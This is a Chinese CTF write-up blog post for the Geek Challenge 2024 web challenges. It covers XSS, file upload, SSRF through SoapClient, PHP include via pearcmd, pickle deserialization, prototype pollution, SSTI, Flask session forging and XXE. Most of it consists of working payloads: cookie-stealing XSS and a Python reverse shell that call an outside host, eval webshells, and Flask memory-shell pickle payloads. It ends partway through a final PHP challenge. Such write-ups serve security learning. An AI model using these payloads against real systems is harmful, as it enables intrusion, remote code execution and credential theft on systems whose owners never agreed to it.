+++
title = "极客大挑战2024"
slug = "geek-challenge-2024"
description = "隔壁三叶草新生赛都这么难嘛"
date = "2024-11-25T21:04:47"
lastmod = "2024-11-25T21:04:47"
image = ""
license = ""
categories = ["赛题"]
tags = ["pickle", "php", "session", "jwt", "nodejs", "jail"]
+++

# 0x02 question

## problem_on_my_web

表白墙？先F12看看有没有什么http头的限制，没看到有，那测试，发现弹窗了

```
<script>alert(1)</script>

If you could tell me where my website has a problem,i would give you a gift in my cookies!!! [Post url=]
```

![1](QQ20241127-104347.png)

那把cookie带出来就行，不过貌似得重开一下靶机了，一直弹1

```
<body/**/onload="window.open('http://156.238.233.9:9999/'+document.cookie)">
```

emm没成功没有反应

```
<script>window.open('http://156.238.233.9:9999/'+document.cookie)</script>
```

还是不对，那用fetch带出cookie来

```
<script>fetch('http://156.238.233.9:9999/?a'+document.cookie)</script>
```

还是不行？

```
<script>alert(document.cookie)</script>
```

这么写反而是收到了flag

![1](QQ20241127-110058.png)

## baby_upload

文件上传

![1](QQ20241127-110303.png)

CVE-2017-15715

```http
POST /index.php HTTP/2
Host: 80-fb985bf1-f567-480e-9a3a-0ed6f71f9d10.challenge.ctfplus.cn
Content-Length: 417
Cache-Control: max-age=0
Sec-Ch-Ua: "Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Origin: https://80-fb985bf1-f567-480e-9a3a-0ed6f71f9d10.challenge.ctfplus.cn
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTydF0xs9mhTjHWpP
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://80-fb985bf1-f567-480e-9a3a-0ed6f71f9d10.challenge.ctfplus.cn/index.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Priority: u=0, i

------WebKitFormBoundaryTydF0xs9mhTjHWpP
Content-Disposition: form-data; name="upload_file"; filename="1.php"
Content-Type: application/octet-stream

<?php phpinfo();?>
------WebKitFormBoundaryTydF0xs9mhTjHWpP
Content-Disposition: form-data; name="name"

1.jpg.php
------WebKitFormBoundaryTydF0xs9mhTjHWpP
Content-Disposition: form-data; name="submit"

上传
------WebKitFormBoundaryTydF0xs9mhTjHWpP--

```

但是那个`\n`绕过的没有成功，不知道怎么回事

##  ez_SSRF

直接拿源码`/www.zip`

calculator.php

```php
<?php
$admin="aaaaaaaaaaaadmin";
$adminpass="i_want_to_getI00_inMyT3st";

function check($auth) {
    global $admin,$adminpass;
    $auth = str_replace('Basic ', '', $auth);
    $auth = base64_decode($auth);
    list($username, $password) = explode(':', $auth);
    echo $username."<br>".$password;
    if($username===$admin && $password===$adminpass) {
        return 1;
    }else{
        return 2;
    }
}
if($_SERVER['REMOTE_ADDR']!=="127.0.0.1"){
    exit("Hacker");
}
$expression = $_POST['expression'];
$auth=$_SERVER['HTTP_AUTHORIZATION'];
if(isset($auth)){
    if (check($auth)===2) {
        if(!preg_match('/^[0-9+\-*\/]+$/', $expression)) {
            die("Invalid expression");
        }else{
            $result=eval("return $expression;");
            file_put_contents("result",$result);
        }
    }else{
        $result=eval("return $expression;");
        file_put_contents("result",$result);
    }
}else{
    exit("Hacker");
}

```

这里面我们可以直接看到就是说有能够RCE的地方

![1](QQ20241127-192536.png)

```php
<?php
error_reporting(0);
if(!isset($_POST['user'])){
    $user="stranger";
}else{
    $user=$_POST['user'];
}

if (isset($_GET['location'])) {
    $location=$_GET['location'];
    $client=new SoapClient(null,array(
        "location"=>$location,
        "uri"=>"hahaha",
        "login"=>"guest",
        "password"=>"gueeeeest!!!!",
        "user_agent"=>$user."'s Chrome"));

    $client->calculator();

    echo file_get_contents("result");
}else{
    echo "Please give me a location";
}

```

这里再利用`SoapClient`来进行访问，写poc，这里注意还有cookie

```
aaaaaaaaaaaadmin:i_want_to_getI00_inMyT3st

YWFhYWFhYWFhYWFhZG1pbjppX3dhbnRfdG9fZ2V0STAwX2luTXlUM3N0
```

自己写了半天，发现还是写不好，直接用Y4的这种吧，我自己写的那种直接加`\r\n`的，就是容易写错

```php
<?php
$target="http://127.0.0.1/flag.php";
$post_string='expression=system("cat /flag > flag");';
$headers=array(
    'x-forwarded-for: 127.0.0.1',
    'AUTHORIZATION: YWFhYWFhYWFhYWFhZG1pbjppX3dhbnRfdG9fZ2V0STAwX2luTXlUM3N0'
);
$b = new SoapClient(null,array('location' => $target,'user_agent'=>'baozongwi^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '.(string)strlen($post_string).'^^^^'.$post_string,'uri' => "test"));

$aaa = serialize($b);
$aaa = str_replace('^^',"\r\n",$aaa);
$aaa = str_replace('&','&',$aaa);
echo urlencode($aaa);

```

然后只要一部分插入的一部分

```http
POST /h4d333333.php?location=http://127.0.0.1/calculator.php HTTP/1.1
Host: 80-0b944c25-6b76-493d-9af4-1cf38c499e88.challenge.ctfplus.cn
Content-Length: 276
Pragma: no-cache
Cache-Control: no-cache
Origin: http://80-0b944c25-6b76-493d-9af4-1cf38c499e88.challenge.ctfplus.cn
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://80-0b944c25-6b76-493d-9af4-1cf38c499e88.challenge.ctfplus.cn/h4d333333.php?location=http://127.0.0.1/calculator.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
x-forwarded-for: 127.0.0.1
Connection: close

user=baozongwi%0D%0AContent-Type%3A+application%2Fx-www-form-urlencoded%0D%0Ax-forwarded-for%3A+127.0.0.1%0D%0AAUTHORIZATION%3A+YWFhYWFhYWFhYWFhZG1pbjppX3dhbnRfdG9fZ2V0STAwX2luTXlUM3N0%0D%0AContent-Length%3A+38%0D%0A%0D%0Aexpression%3Dsystem%28%22cat+%2Fflag+%3E+flag%22%29%3B
```

成功拿到flag(不得不说Y4师傅还是吊，这脚本比我自己之前写的好用多了)

## 100%的⚪

查看源码解码拿到flag

## ez_http

```http
POST /?welcome=geekchallenge2024 HTTP/1.1
Host: 80-b5177aaf-e3f8-4300-b125-f5169d300c3f.challenge.ctfplus.cn
Content-Length: 37
Pragma: no-cache
Cache-Control: no-cache
Origin: http://80-b5177aaf-e3f8-4300-b125-f5169d300c3f.challenge.ctfplus.cn
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: https://www.sycsec.com
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJTdGFydmVuIiwiYXVkIjoiQ3RmZXIiLCJpYXQiOjE3MzI2NzgzMzIsIm5iZiI6MTczMjY3ODMzMiwiZXhwIjoxNzMyNjg1NTMyLCJ1c2VybmFtZSI6IlN0YXJ2ZW4iLCJwYXNzd29yZCI6InF3ZXJ0MTIzNDU2IiwiaGFzRmxhZyI6dHJ1ZX0.ksF0QR3mGMhPK4cNAOjW_HTEYrzDdWqarotuynZEh98
starven: I_Want_Flag
x-real-ip: 127.0.0.1
Connection: close

username=Starven&password=qwert123456
```

## ez_include

```php
<?php
highlight_file(__FILE__);
require_once 'starven_secret.php';
if(isset($_GET['file'])) {
    if(preg_match('/starven_secret.php/i', $_GET['file'])) {
        require_once $_GET['file'];
    }else{
        echo "还想非预期?";
    }
}
```

require_once文件包含绕过之前在学习session文件包含的时候知道怎么绕过

```
?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/starven_secret.php
```

```php
<?php
$secret = "congratulation! you can goto /levelllll2.php to capture the flag!";
?>
```

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
if (isset($_GET ["syc"])){
    $file = $_GET ["syc"];
    $hint = "register_argc_argv = On";
    if (preg_match("/config|create|filter|download|phar|log|sess|-c|-d|%|data/i", $file)) {
        die("hint都给的这么明显了还不会做?");
    }
    if(substr($_SERVER['REQUEST_URI'], -4) === '.php'){
        include $file;
    }
}
```

URI就是整个http路径，所以我们要把`.php`写到最后，然后有`register_argc_argv = On`这里一查就知道使用`pearcmd.php`，现在就是想怎么绕过了

```
?syc=/usr/local/lib/php/pearcmd.php&+config-create+/<?=@eval($_POST['shell']);?>+/var/www/html/shell.php
```

有回显但是没有生效，看P牛的文章知道原因

![1](QQ20241127-115023.png)

```http
GET /levelllll2.php?syc=/usr/local/lib/php/pearcmd.php&+config-create+/<?=@eval($_POST['shell']);?>+/var/www/html/shell.php HTTP/1.1
Host: 80-8beb2066-ceb4-4304-ba50-b14fd0a1c4b1.challenge.ctfplus.cn
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close


```

就getshell了，继续包含执行就行

![1](QQ20241127-115638.png)

## ez_python

直接注册登录然后拿到源码

```python
import os
import secrets
from flask import Flask, request, render_template_string, make_response, render_template, send_file
import pickle
import base64
import black

app = Flask(__name__)

#To Ctfer：给你源码只是给你漏洞点的hint，怎么绕？black.py黑盒，唉无意义
@app.route('/')
def index():
    return render_template_string(open('templates/index.html').read())

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        usname = request.form['username']
        passwd = request.form['password']

        if usname and passwd:
            heart_cookie = secrets.token_hex(32)
            response = make_response(f"Registered successfully with username: {usname} <br> Now you can go to /login to heal starven's heart")
            response.set_cookie('heart', heart_cookie)
            return response

    return  render_template('register.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    heart_cookie = request.cookies.get('heart')
    if not heart_cookie:
        return render_template('warning.html')

    if request.method == 'POST' and request.cookies.get('heart') == heart_cookie:
        statement = request.form['statement']

        try:
            heal_state = base64.b64decode(statement)
            print(heal_state)
            for i in black.blacklist:
                if i in heal_state:
                    return render_template('waf.html')
            pickle.loads(heal_state)
            res = make_response(f"Congratulations! You accomplished the first step of healing Starven's broken heart!")
            flag = os.getenv("GEEK_FLAG") or os.system("cat /flag")
            os.system("echo " + flag + " > /flag")
            return res
        except Exception as e:
            print( e)
            pass
            return "Error!!!! give you hint: maybe you can view /starven_s3cret"

    return render_template('login.html')

@app.route('/monologue',methods=['GET','POST'])
def joker():
    return render_template('joker.html')

@app.route('/starven_s3cret', methods=['GET', 'POST'])
def secret():
    return send_file(__file__,as_attachment=True)


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
```

一眼丁真，pickle反序列化

```python
import pickle
from flask import Flask, request
import base64

app = Flask(__name__)

class A():
    def __reduce__(self):
        return (eval, ('app.add_route(lambda request:__import__("os").popen(request.args.get("cmd")).read(), "/shell", methods=["GET", "POST"])',))

a = A()
b = pickle.dumps(a)

print(base64.b64encode(b).decode())
```

bushi哥们，居然不行，换个内存马写一下

```python
import pickle
from flask import Flask, request
import base64

app = Flask(__name__)

class A():
    def __reduce__(self):
        return (eval, ('__import__("sys").modules["__main__"].__dict__["app"].before_request_funcs.setdefault(None,[]).append(lambda :__import__("os").popen(request.args.get("cmd")).read())',))

a = A()
b = pickle.dumps(a)

print(base64.b64encode(b).decode())


```

然后直接RCE

## ez_js

```js
   <script>
        function submitForm() {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            fetch('/login', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ username, password })
            })
            .then(response => response.json())
            .then(data => console.log(data))
            .catch(error => console.error('Error:', error));
        }
    </script>
```

抓包拿到代码之后，感觉没啥有用信息，随便登录之后拿到响应包

```http
HTTP/1.1 200 OK
Date: Wed, 27 Nov 2024 10:38:03 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 338
Connection: close
X-Powered-By: Express
Accept-Ranges: bytes
Cache-Control: public, max-age=0
Last-Modified: Fri, 20 Sep 2024 03:04:08 GMT
ETag: W/"152-1920d630c40"
Cache-Control: no-cache

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>账号或密码错误</title>
    <h1>账号和密码好像没对呢?</h1>
    <h1>Username:${{Author}}</h1>
    <h1>Password:len(password) = 6 弱密码&纯数字</h1>
</html>
```

嗯爆破就行，这还是比较好爆破的

```http
POST /login HTTP/1.1
Host: 3000-e3c8535a-5b1c-4fbf-915b-13c41ab64ff3.challenge.ctfplus.cn
Content-Length: 42
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://3000-e3c8535a-5b1c-4fbf-915b-13c41ab64ff3.challenge.ctfplus.cn
Referer: http://3000-e3c8535a-5b1c-4fbf-915b-13c41ab64ff3.challenge.ctfplus.cn/login
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close

{"username":"Starven","password":"123456"}
```

```js
// utils/common.js
function merge(object1, object2) {
    for (let key in object2) {
        if (key in object2 && key in object1) {
            merge(object1[key], object2[key]);  // 如果两个对象都有该键，则递归合并
        } else {
            object1[key] = object2[key];  // 否则直接赋值
        }
    }
}

module.exports = { merge };


// login handler
const { merge } = require('./utils/common.js');
const path = require('path'); // 确保引入 path 模块

function handleLogin(req, res) {
    // 创建 geeker 对象，并初始化 geekerData
    var geeker = new function() {
        this.geekerData = new function() {
            this.username = req.body.username;
            this.password = req.body.password;
        };
    };

    // 将 req.body 的内容合并到 geeker 对象中
    merge(geeker, req.body);

    // 检查用户名和密码
    if (geeker.geekerData.username === 'Starven' && geeker.geekerData.password === '123456') {
        if (geeker.hasFlag) {
            // 如果 hasFlag 为 true，返回 direct.html
            const filePath = path.join(__dirname, 'static', 'direct.html');
            res.sendFile(filePath, (err) => {
                if (err) {
                    console.error(err);
                    res.status(err.status).end();
                }
            });
        } else {
            // 否则返回 error.html
            const filePath = path.join(__dirname, 'static', 'error.html');
            res.sendFile(filePath, (err) => {
                if (err) {
                    console.error(err);
                    res.status(err.status).end();
                }
            });
        }
    } else {
        // 如果用户名或密码不正确，返回 error2.html
        const filePath = path.join(__dirname, 'static', 'error2.html');
        res.sendFile(filePath, (err) => {
            if (err) {
                console.error(err);
                res.status(err.status).end();
            }
        });
    }
}

module.exports = { handleLogin };
```

可以看到`common.js`是可以进行污染的，`merge(geeker, req.body);`直接污染就行

```http
POST /login HTTP/1.1
Host: 3000-e3c8535a-5b1c-4fbf-915b-13c41ab64ff3.challenge.ctfplus.cn
Content-Length: 71
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://3000-e3c8535a-5b1c-4fbf-915b-13c41ab64ff3.challenge.ctfplus.cn
Referer: http://3000-e3c8535a-5b1c-4fbf-915b-13c41ab64ff3.challenge.ctfplus.cn/login
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close

{"username":"Starven","password":"123456","__proto__":{"hasFlag":true}}
```

fuzz了好几个字典发现url字符会有不同回显

![1](QQ20241127-185408.png)

```
就这还想要flag?
还是和登陆一样，我只是略施小计，你知道咋绕过吗？
```

那么肯定是传json了

```json
{"username":"Starven","password":"123456","hasFlag":true}
```

这样子不能过要绕过，这个和**infernity**师傅进行过讨论，我只能说纯抽象啊，而且传参使用数组害的用syc链接

```http
GET /flag?syc={"username":"Starven"&syc="password":"123456"&syc="hasFlag":true} HTTP/2
Host: 3000-e3c8535a-5b1c-4fbf-915b-13c41ab64ff3.challenge.ctfplus.cn
Pragma: no-cache
Cache-Control: no-cache
Sec-Ch-Ua: "Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Sec-Fetch-User: ?1
Priority: u=0, i


```

## SecretInDrivingSchool

源码里面拿到路径看到是要进后台了，注册都点不动？

![1](QQ20241127-121751.png)

经过我的经验这种东西，top1000爆破不出来，所以我们就写`syc`的各种形式

```python
def generate_combinations(s):
    n = len(s)
    combinations = []

    # 进行 2^n 次循环
    for i in range(2 ** n):
        combination = []
        for j in range(n):
            # 根据当前位的二进制值决定字母的大小写
            if (i >> j) & 1:
                combination.append(s[j].upper())
            else:
                combination.append(s[j].lower())
        combinations.append(''.join(combination))

    return combinations


# 输入字符串
input_string = "syc"
result = generate_combinations(input_string)

# 输出结果
for combo in result:
    print(combo)

```

![1](QQ20241127-122145.png)

为啥呢，我爆破弱密码基本比赛从来没有爆破出来过，所以这是经验之谈，进来是一个简单的后台直接插入代码即可

![1](QQ20241127-122317.png)

```
assert($_REQUEST[a]);
```

马是没成功的，但是flag还是拿到了，不知道为啥antsword链接不上

我进行本地测试发现也连接不上

最后过了十几分钟发现了原因

![1](QQ20241127-125723.png)

后来和几个师傅一起讨论知道了原因，**cola**师傅找到了一篇文章，我们看到最后的Wireshark的包就懂了

[assert种马](https://www.cnblogs.com/Article-kelp/p/14704975.html)

## Can_you_Pass_me

一个SSTI注入，能梭哈绝对不手动，毕竟有回显

```
{%print ((((joiner|attr(\'_\'\'_init__\')|attr(\'_\'\'_globals__\')|attr(\'__g\'\'etitem__\'))(\'_\'\'_builtins__\')).__import__("o""s")|attr(\'p\'\'open\'))("\\x6c\\x73\\x20\\x2f")|attr(\'r\'\'ead\'))()%}

{%print ((((joiner|attr(\'_\'\'_init__\')|attr(\'_\'\'_globals__\')|attr(\'__g\'\'etitem__\'))(\'_\'\'_builtins__\')).__import__("o""s")|attr(\'p\'\'open\'))("\\x63\\x61\\x74\\x20\\x2f\\x66\\x2a\\x20\\x3e\\x20\\x2f\\x74\\x6d\\x70\\x2f\\x66\\x6c\\x61\\x67")|attr(\'r\'\'ead\'))()%}
```

然后就发现flag始终写不出来，那就弹吧

```
https://www.ddosi.org/shell/
```

用这个网站

```python
export RHOST="156.238.233.9";export RPORT=9999;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```

## py_game

注册登录看到是普通用户下意识F12找验证，看到cookie里面有个session

```
flask-unsign --unsign --cookie 'eyJfZmxhc2hlcyI6W3siIHQiOlsic3VjY2VzcyIsIlx1NzY3Ylx1NWY1NVx1NjIxMFx1NTI5ZiJdfV0sInVzZXJuYW1lIjoiYmFvem9uZ3dpIn0.Z0fmAw.Enwu33iLTu4gO_fnimUfrwaV0gc' --wordlist
```

中途由于字典原因还重新安装了一下

![1](QQ20241128-115320.png)

爆破出来了，那么伪造成admin

```
flask-unsign --sign --cookie "{'_flashes': [('success', '登录成功')], 'username': 'admin'}" --secret 'a123456'

eyJfZmxhc2hlcyI6W3siIHQiOlsic3VjY2VzcyIsIlx1NzY3Ylx1NWY1NVx1NjIxMFx1NTI5ZiJdfV0sInVzZXJuYW1lIjoiYWRtaW4ifQ.Z0fp6w.MzLPkoTlsTFYslDhYDkMgU3izyQ
```

替换之后拿到源码，在线反编译一下

```python
#!/usr/bin/env python
# visit https://tool.lu/pyc/ for more information
# Version: Python 3.6

import json
from lxml import etree
from flask import Flask, request, render_template, flash, redirect, url_for, session, Response, send_file, jsonify

app = Flask(__name__)
app.secret_key = 'a123456'
app.config['xml_data'] = '<?xml version="1.0" encoding="UTF-8"?><GeekChallenge2024><EventName>Geek Challenge</EventName><Year>2024</Year><Description>This is a challenge event for geeks in the year 2024.</Description></GeekChallenge2024>'

class User:
    def __init__(self, username, password):
        self.username = username
        self.password = password

    def check(self, data):
        if self.username == data['username']:
            return self.password == data['password']
        return False

admin = User('admin', '123456j1rrynonono')
Users = [admin]

def update(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and isinstance(v, dict):
                update(v, dst.get(k))
            else:
                dst[k] = v
        if hasattr(dst, k) and isinstance(v, dict):
            update(v, getattr(dst, k))
            continue
        setattr(dst, k, v)

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        for u in Users:
            if u.username == username:
                flash('用户名已存在', 'error')
                return redirect(url_for('register'))

        new_user = User(username, password)
        Users.append(new_user)
        flash('注册成功！请登录', 'success')
        return redirect(url_for('login'))
    return render_template('register.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        for u in Users:
            if u.check({'username': username, 'password': password}):
                session['username'] = username
                flash('登录成功', 'success')
                return redirect(url_for('dashboard'))

        flash('用户名或密码错误', 'error')
        return redirect(url_for('login'))
    return render_template('login.html')

@app.route('/play', methods=['GET', 'POST'])
def play():
    if 'username' in session:
        with open('/app/templates/play.html', 'r', encoding='utf-8') as file:
            play_html = file.read()
        return play_html
    flash('请先登录', 'error')
    return redirect(url_for('login'))

@app.route('/admin', methods=['GET', 'POST'])
def admin_route():
    if 'username' in session and session['username'] == 'admin':
        return render_template('admin.html', username=session['username'])
    flash('你没有权限访问', 'error')
    return redirect(url_for('login'))

@app.route('/downloads321')
def downloads321():
    return send_file('./source/app.pyc', as_attachment=True)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/dashboard')
def dashboard():
    if 'username' in session:
        is_admin = session['username'] == 'admin'
        user_tag = 'Admin User' if is_admin else 'Normal User'
        return render_template('dashboard.html', username=session['username'], tag=user_tag, is_admin=is_admin)
    flash('请先登录', 'error')
    return redirect(url_for('login'))

@app.route('/xml_parse')
def xml_parse():
    try:
        xml_bytes = app.config['xml_data'].encode('utf-8')
        parser = etree.XMLParser(load_dtd=True, resolve_entities=True)
        tree = etree.fromstring(xml_bytes, parser)
        result_xml = etree.tostring(tree, pretty_print=True, encoding='utf-8', xml_declaration=True)
        return Response(result_xml, mimetype='application/xml')
    except etree.XMLSyntaxError as e:
        return str(e), 400

black_list = [
    '__class__'.encode(),
    '__init__'.encode(),
    '__globals__'.encode()
]

def check(data):
    for i in black_list:
        if i in data:
            return False
    return True

@app.route('/update', methods=['POST'])
def update_route():
    if 'username' in session and session['username'] == 'admin':
        if request.data:
            try:
                if not check(request.data):
                    return 'NONONO, Bad Hacker', 403
                data = json.loads(request.data.decode())
                if all(data.values()):
                    update(data, User)
                    return jsonify({'message': '更新成功'}), 200
                return 'No data provided', 400
            except Exception as e:
                return f'Exception: {str(e)}', 500
    return redirect(url_for('login'))

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80, debug=False)

```

拿到之后看到太多了，放编译器里面慢慢看

![1](QQ20241128-120311.png)

看到有污染的地方，搜索一下发现，在`/update`下面可以污染，不过要绕过check，看一下check

![1](QQ20241128-120609.png)

大概就是这一张图，然后我们在`/xml_parse`就可以拿到回显，因为进行了xml文档的更新

![1](QQ20241128-121743.png)

先写poc

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

unicode绕过就可以了

```python
payload = {
    "__init__": {
        "__globals__": {
            "app": {
                "config": {
                    "xml_data": '''
                    <?xml version="1.0" encoding="UTF-8"?>
                    <!DOCTYPE foo [
                        <!ENTITY xxe SYSTEM "file:///etc/passwd">
                    ]>
                    <foo>&xxe;</foo>
                    '''
                }
            }
        }
    }
}

# __init__
# \u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f
```

但是这里我犯了一个不知道的错误就是在json中是不能使用`'''`的

```http
POST /update HTTP/1.1
Host: 80-eeb40e0d-c438-4233-8caa-757667ab7258.challenge.ctfplus.cn
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://80-eeb40e0d-c438-4233-8caa-757667ab7258.challenge.ctfplus.cn/login
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: session=eyJfZmxhc2hlcyI6W3siIHQiOlsic3VjY2VzcyIsIlx1NzY3Ylx1NWY1NVx1NjIxMFx1NTI5ZiJdfV0sInVzZXJuYW1lIjoiYWRtaW4ifQ.Z0fp6w.MzLPkoTlsTFYslDhYDkMgU3izyQ
Connection: close
Content-Type: application/json
Content-Length: 353

{
    "\u005F\u005Finit__": {
        "\u005F\u005Fglobals__": {
            "app": {
                "config": {
                    "xml_data": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [\n    <!ENTITY xxe SYSTEM \"F\u0069\u006C\u0065:///etc/passwd\">\n]>\n<foo>&xxe;</foo>"
                }
            }
        }
    }
}
```

这里还有个奇怪的地方就是不能用小写的f来使用file协议(算了当特性)

![1](QQ20241128-123227.png)

然后继续读就可以了

## jwt_pickle

```python
import base64
import hashlib
import random
import string
from flask import Flask,request,render_template,redirect
import jwt
import pickle

app = Flask(__name__,static_folder="static",template_folder="templates")

privateKey=open("./private.pem","rb").read()
publicKey=open("./public.pem","rb").read()
characters = string.ascii_letters + string.digits + string.punctuation
adminPassword = ''.join(random.choice(characters) for i in range(18))
user_list={"admin":adminPassword}

@app.route("/register",methods=["GET","POST"])
def register():
    if request.method=="GET":
        return render_template("register.html")
    elif request.method=="POST":
        username=request.form.get("username")
        password=request.form.get("password")
        if (username==None)|(password==None)|(username in user_list):
            return "error"

        user_list[username]=password
        return "OK"


@app.route("/login",methods=["GET","POST"])
def login():
    if request.method=="GET":
        return render_template("login.html")
    elif request.method=="POST":
        username = request.form.get("username")
        password = request.form.get("password")
        if (username == None) | (password == None):
            return "error"

        if username not in user_list:
            return "please register first"

        if user_list[username] !=password:
            return "your password is not right"

        ss={"username":username,"password":hashlib.md5(password.encode()).hexdigest(),"is_admin":False}
        if username=="admin":
            ss["is_admin"]=True
            ss.update(introduction=base64.b64encode(pickle.dumps("1ou_Kn0w_80w_to_b3c0m3_4dm1n?")).decode())

        token=jwt.encode(ss,privateKey,algorithm='RS256')

        return "OK",200,{"Set-Cookie":"Token="+token.decode()}


@app.route("/admin",methods=["GET"])
def admin():
    token=request.headers.get("Cookie")[6:]
    print(token)
    if token ==None:
        redirect("login")
    try:
        real= jwt.decode(token, publicKey, algorithms=['HS256', 'RS256'])
    except Exception as e:
        print(e)
        return "error"
    username = real["username"]
    password = real["password"]
    is_admin = real["is_admin"]
    if password != hashlib.md5(user_list[username].encode()).hexdigest():
        return "Hacker!"

    if is_admin:
        serial_S = base64.b64decode(real["introduction"])
        introduction=pickle.loads(serial_S)
        return f"Welcome!!!,{username},introduction: {introduction}"
    else:
        return f"{username},you don't have enough permission in here"

@app.route("/",methods=["GET"])
def jump():
    return redirect("login")

if __name__ == "__main__":
    app.run(debug=False,host="0.0.0.0",port=80)
```

这道题的jwt很像网鼎杯青龙的那道题有意思剩下的明天做



## PHP不比java差

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
include "secret.php";

class Challenge{
    public $file;
    public function Sink()
    {
        echo "<br>!!!A GREAT STEP!!!<br>";
        echo "Is there any file?<br>";
        if(file_exists($this->file)){
            global $FLAG;
            echo $FLAG;
        }
    }
}

class Geek{
    public $a;
    public $b;
    public function __unserialize(array $data): void
    {
        $change=$_GET["change"];
